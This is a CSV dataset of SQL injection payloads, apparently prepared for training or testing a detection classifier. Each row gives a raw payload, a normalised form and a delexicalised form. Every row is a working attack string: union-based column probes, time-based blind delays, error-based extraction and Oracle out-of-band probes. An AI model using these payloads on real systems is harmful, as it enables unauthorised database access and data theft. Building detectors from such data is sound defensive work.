payload_raw,label,source,sqli_type_hint,is_obfuscated,payload_norm,payload_delex
"1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""tgdu""  =  ""tgdu",1,sqli_dataset.csv,,True,"1"" ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ""tgdu"" = ""tgdu",<NUM><STR>tgdu<STR>tgdu
"-1510'   )    )     )   union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",1,sqli_dataset.csv,,False,"-1510' ) ) ) union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--","-<NUM>' ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"1""  )   union all select null,null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1"" ) union all select null,null,null,null,null,null,null#","<NUM>"" ) union all select null,null,null,null,null,null,null#"
"elt  (  8192  =  8192,sleep  (  5   )    )   ",1,sqli_dataset.csv,,False,"elt ( 8192 = 8192,sleep ( 5 ) )","elt ( <NUM> = <NUM>,sleep ( <NUM> ) )"
end and    (    (   'zeyr'  =  'zeyr,1,sqli_dataset.csv,,False,end and ( ( 'zeyr' = 'zeyr,end and ( ( <STR> = 'zeyr
"1""   )    )    as luon where 4676  =  4676 rlike sleep  (  5  )  #",1,sqli_dataset.csv,,False,"1"" ) ) as luon where 4676 = 4676 rlike sleep ( 5 ) #","<NUM>"" ) ) as luon where <NUM> = <NUM> rlike sleep ( <NUM> ) #"
"1""  )   where 6138  =  6138 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,sqli_dataset.csv,,False,"1"" ) where 6138 = 6138 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --","<NUM>"" ) where <NUM> = <NUM> and <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ) --"
"1"" where 3740  =  3740 rlike sleep  (  5  )  #",1,sqli_dataset.csv,,False,"1"" where 3740 = 3740 rlike sleep ( 5 ) #","<NUM>"" where <NUM> = <NUM> rlike sleep ( <NUM> ) #"
"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kgdt' like 'kgdt",1,sqli_dataset.csv,,False,"1' ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( 'kgdt' like 'kgdt",<NUM><STR>kgdt<STR>kgdt
1  )   as tngy where 8956  =  8956 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1,sqli_dataset.csv,,True,1 ) as tngy where 8956 = 8956 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,<NUM> ) as tngy where <NUM> = <NUM> rlike ( select ( case when ( <NUM> = <NUM> ) then <NUM> else 0x28 end ) ) --
"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",1,sqli_dataset.csv,,False,"-4230"" ) ) ) union all select 6962,6962,6962,6962,6962,6962#","-<NUM>"" ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
-3540 where 7302  =  7302 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,sqli_dataset.csv,,False,-3540 where 7302 = 7302 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,-<NUM> where <NUM> = <NUM> or <NUM> = utl_inaddr.get_host_address ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) --
"1  )   as lfra where 2669  =  2669 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,sqli_dataset.csv,,True,"1 ) as lfra where 2669 = 2669 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --","<NUM> ) as lfra where <NUM> = <NUM> and updatexml ( <NUM>,concat ( 0x2e,0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71 ) ,<NUM> ) --"
1'  )   rlike sleep  (  5  )   and   (  'qsub' like 'qsub,1,sqli_dataset.csv,,False,1' ) rlike sleep ( 5 ) and ( 'qsub' like 'qsub,<NUM><STR>qsub<STR>qsub
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",1,sqli_dataset.csv,,False,"1%"" ) ) ) union all select null,null,null,null,null,null,null,null--","<NUM>%"" ) ) ) union all select null,null,null,null,null,null,null,null--"
"1'+  (  select 'uzaw' where 9900  =  9900 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'",1,sqli_dataset.csv,,True,"1'+ ( select 'uzaw' where 9900 = 9900 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) +'",<NUM><STR>uzaw<STR>
"1""  )   as dlfq where 8410  =  8410",1,sqli_dataset.csv,,False,"1"" ) as dlfq where 8410 = 8410","<NUM>"" ) as dlfq where <NUM> = <NUM>"
"1  )   as guru where 7615  =  7615 union all select null,null,null,null,null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1 ) as guru where 7615 = 7615 union all select null,null,null,null,null,null,null,null,null,null#","<NUM> ) as guru where <NUM> = <NUM> union all select null,null,null,null,null,null,null,null,null,null#"
"1  )   and make_set  (  1559  =  4863,4863  )  ",1,sqli_dataset.csv,,False,"1 ) and make_set ( 1559 = 4863,4863 )","<NUM> ) and make_set ( <NUM> = <NUM>,<NUM> )"
-9484' or   (  7129  =  2349  )  *2349 and 'fcsa' like 'fcsa,1,sqli_dataset.csv,,False,-9484' or ( 7129 = 2349 ) *2349 and 'fcsa' like 'fcsa,-<NUM><STR>fcsa<STR>fcsa
"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,sqli_dataset.csv,,True,"1' ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )","<NUM>' ) or ( select <NUM> from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) x from information_schema.character_sets group by x ) a )"
"1"" where 5328  =  5328 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,sqli_dataset.csv,,True,"1"" where 5328 = 5328 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #","<NUM>"" where <NUM> = <NUM> and <NUM> = benchmark ( <NUM>,md5 ( 0x6d457153 ) ) #"
"1""   )    )     )   union all select null,null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1"" ) ) ) union all select null,null,null,null,null,null,null#","<NUM>"" ) ) ) union all select null,null,null,null,null,null,null#"
1'  )   as ihsc where 3978  =  3978,1,sqli_dataset.csv,,False,1' ) as ihsc where 3978 = 3978,<NUM>' ) as ihsc where <NUM> = <NUM>
"-6125'||  (  select 'hwnm' where 1428  =  1428 union all select 1428,1428,1428,1428,1428,1428#",1,sqli_dataset.csv,,False,"-6125'|| ( select 'hwnm' where 1428 = 1428 union all select 1428,1428,1428,1428,1428,1428#","-<NUM><STR>hwnm' where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,sqli_dataset.csv,,False,select ( case when ( 4660 = 4660 ) then 4660 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,select ( case when ( <NUM> = <NUM> ) then <NUM> else cast ( <NUM> as int ) / ( select <NUM> from dual ) end ) from dual--
1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,1,sqli_dataset.csv,,False,1 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ),<NUM> rlike ( select * from ( select ( sleep ( <NUM> ) ) ) sgvo )
"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'pbtf'  =  'pbtf",1,sqli_dataset.csv,,True,"1' ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( 'pbtf' = 'pbtf",<NUM><STR>pbtf<STR>pbtf
"1'  )   where 7391  =  7391 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,sqli_dataset.csv,,True,"1' ) where 7391 = 7391 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --","<NUM>' ) where <NUM> = <NUM> or ( select <NUM> from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) x from information_schema.character_sets group by x ) a ) --"
1'+  (  select dklj where 3265  =  3265,1,sqli_dataset.csv,,True,1'+ ( select dklj where 3265 = 3265,<NUM>'+ ( select dklj where <NUM> = <NUM>
"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,sqli_dataset.csv,,False,"1' ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )","<NUM><STR>abcdefg',upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) )"
"1'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'cbwx'  =  'cbwx",1,sqli_dataset.csv,,False,"1' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'cbwx' = 'cbwx",<NUM><STR>cbwx<STR>cbwx
-3422%'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  ',1,sqli_dataset.csv,,False,-3422%' ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( '%' = ',-<NUM>%<STR>qqpjq<STR>qzvzq<STR>%<STR>
select pg_sleep  (  5  )   and    (    (     (  9476  =  9476,1,sqli_dataset.csv,,False,select pg_sleep ( 5 ) and ( ( ( 9476 = 9476,select pg_sleep ( <NUM> ) and ( ( ( <NUM> = <NUM>
"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  -- fwzl",1,sqli_dataset.csv,,True,"1 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) -- fwzl","<NUM> or row ( <NUM>,<NUM> ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) x from ( select <NUM> union select <NUM> union select <NUM> union select <NUM> ) a group by x ) -- fwzl"
-3083  )   or 5221  =  7829,1,sqli_dataset.csv,,False,-3083 ) or 5221 = 7829,-<NUM> ) or <NUM> = <NUM>
"1'   )    )    union all select null,null,null--",1,sqli_dataset.csv,,False,"1' ) ) union all select null,null,null--","<NUM>' ) ) union all select null,null,null--"
"1""  )   as vcvw where 2445  =  2445 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,sqli_dataset.csv,,False,"1"" ) as vcvw where 2445 = 2445 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --","<NUM>"" ) as vcvw where <NUM> = <NUM> and <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ) --"
waitfor delay '0:0:5' and    (    (     (  'ozjl' like 'ozjl,1,sqli_dataset.csv,,False,waitfor delay '0:0:5' and ( ( ( 'ozjl' like 'ozjl,waitfor delay <STR> and ( ( ( <STR> like 'ozjl
"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",1,sqli_dataset.csv,,True,"1%' or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and '%' = '",<NUM>%<STR>%<STR>
"1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'yzdp'  =  'yzdp",1,sqli_dataset.csv,,True,"1' ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 'yzdp' = 'yzdp",<NUM><STR>yzdp<STR>yzdp
"-3411'   )    )     )   union all select 3185,3185,3185,3185,3185,3185,3185,3185--",1,sqli_dataset.csv,,False,"-3411' ) ) ) union all select 3185,3185,3185,3185,3185,3185,3185,3185--","-<NUM>' ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"-6254"" where 8941  =  8941 or elt  (  1032  =  1032,3623  )  --",1,sqli_dataset.csv,,False,"-6254"" where 8941 = 8941 or elt ( 1032 = 1032,3623 ) --","-<NUM>"" where <NUM> = <NUM> or elt ( <NUM> = <NUM>,<NUM> ) --"
"1' and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sqli_dataset.csv,,False,"1' and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --","<NUM>' and <NUM> = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --"
1   )    )     )   order by 1#,1,sqli_dataset.csv,,False,1 ) ) ) order by 1#,<NUM> ) ) ) order by <NUM>#
"-5027%""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,1,sqli_dataset.csv,,False,"-5027%"" ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ""%"" = """,-<NUM>%<STR>%<STR>
select   (  case when   (  4006  =  1276  )   then 1 else 4006*  (  select 4006 from master..sysdatabases  )   end  )  --,1,sqli_dataset.csv,,False,select ( case when ( 4006 = 1276 ) then 1 else 4006* ( select 4006 from master..sysdatabases ) end ) --,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from master..sysdatabases ) end ) --
"1'+  (  select 'tzey' where 4491  =  4491 union all select null,null,null,null,null,null,null,null--",1,sqli_dataset.csv,,True,"1'+ ( select 'tzey' where 4491 = 4491 union all select null,null,null,null,null,null,null,null--","<NUM><STR>tzey' where <NUM> = <NUM> union all select null,null,null,null,null,null,null,null--"
"select count  (  *  )   from generate_series  (  1,5000000  )  # fnck",1,sqli_dataset.csv,,False,"select count ( * ) from generate_series ( 1,5000000 ) # fnck","select count ( * ) from generate_series ( <NUM>,<NUM> ) # fnck"
1 order by 1#,1,sqli_dataset.csv,,False,1 order by 1#,<NUM> order by <NUM>#
1   )    )    as xbii where 2262  =  2262 or sleep  (  5  )  --,1,sqli_dataset.csv,,False,1 ) ) as xbii where 2262 = 2262 or sleep ( 5 ) --,<NUM> ) ) as xbii where <NUM> = <NUM> or sleep ( <NUM> ) --
-9340  )   where 5462  =  5462 or 3038  =  3038,1,sqli_dataset.csv,,False,-9340 ) where 5462 = 5462 or 3038 = 3038,-<NUM> ) where <NUM> = <NUM> or <NUM> = <NUM>
1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,1,sqli_dataset.csv,,False,1' ) or sleep ( 5 ) and ( 'fizk' = 'fizk,<NUM><STR>fizk<STR>fizk
"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",1,sqli_dataset.csv,,False,"-6405 ) as ilah where 5145 = 5145 union all select 5145,5145,5145,5145,5145--","-<NUM> ) as ilah where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
1   )    )    and   (  4169  =  9887  )  *9887 and    (    (   1137  =  1137,1,sqli_dataset.csv,,False,1 ) ) and ( 4169 = 9887 ) *9887 and ( ( 1137 = 1137,<NUM> ) ) and ( <NUM> = <NUM> ) *<NUM> and ( ( <NUM> = <NUM>
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'bnfu' like 'bnfu",1,sqli_dataset.csv,,False,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'bnfu' like 'bnfu","select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and <STR> like 'bnfu"
1  )   where 6472  =  6472,1,sqli_dataset.csv,,False,1 ) where 6472 = 6472,<NUM> ) where <NUM> = <NUM>
"1%""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""%""  =  """,1,sqli_dataset.csv,,True,"1%"" ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ""%"" = """,<NUM>%<STR>%<STR>
-4595'  )   where 4892  =  4892 order by 1--,1,sqli_dataset.csv,,False,-4595' ) where 4892 = 4892 order by 1--,-<NUM>' ) where <NUM> = <NUM> order by <NUM>--
"1   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   8294  =  8294",1,sqli_dataset.csv,,True,"1 ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( 8294 = 8294","<NUM> ) ) or row ( <NUM>,<NUM> ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) x from ( select <NUM> union select <NUM> union select <NUM> union select <NUM> ) a group by x ) and ( ( <NUM> = <NUM>"
"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'sxgl'  =  'sxgl",1,sqli_dataset.csv,,False,"1' ) ) and make_set ( 8403 = 8403,8899 ) and ( ( 'sxgl' = 'sxgl",<NUM><STR>sxgl<STR>sxgl
1'   )    )    as xirr where 2425  =  2425,1,sqli_dataset.csv,,False,1' ) ) as xirr where 2425 = 2425,<NUM>' ) ) as xirr where <NUM> = <NUM>
"1'   )    )    union all select null,null,null,null,null,null,null,null--",1,sqli_dataset.csv,,False,"1' ) ) union all select null,null,null,null,null,null,null,null--","<NUM>' ) ) union all select null,null,null,null,null,null,null,null--"
1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,sqli_dataset.csv,,False,1' rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,<NUM>' rlike ( select * from ( select ( sleep ( <NUM> ) ) ) vwyq ) #
1'   )    )    as cmll where 7948  =  7948 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,sqli_dataset.csv,,False,1' ) ) as cmll where 7948 = 7948 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,<NUM>' ) ) as cmll where <NUM> = <NUM> and <NUM> = utl_inaddr.get_host_address ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) --
"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",1,sqli_dataset.csv,,True,"1"" ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ""jzbb"" = ""jzbb",<NUM><STR>jzbb<STR>jzbb
"1'   )    )    as xrre where 1172  =  1172 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,sqli_dataset.csv,,True,"1' ) ) as xrre where 1172 = 1172 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --","<NUM>' ) ) as xrre where <NUM> = <NUM> and updatexml ( <NUM>,concat ( 0x2e,0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71 ) ,<NUM> ) --"
"1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",1,sqli_dataset.csv,,False,"1, ( begin if ( 8340 = 8340 ) then dbms_lock.sleep ( 5 )","<NUM>, ( begin if ( <NUM> = <NUM> ) then dbms_lock.sleep ( <NUM> )"
"1'||  (  select 'yhkt' from dual where 7105  =  7105 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   ||'",1,sqli_dataset.csv,,True,"1'|| ( select 'yhkt' from dual where 7105 = 7105 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) ) ||'",<NUM><STR>yhkt<STR>
"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'pded'  =  'pded",1,sqli_dataset.csv,,False,"1' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 'pded' = 'pded",<NUM><STR>pded<STR>pded
1  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  3836  =  3836,1,sqli_dataset.csv,,False,1 ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 3836 = 3836,<NUM> ) and <NUM> = dbms_utility.sqlid_to_sqlhash ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) and ( <NUM> = <NUM>
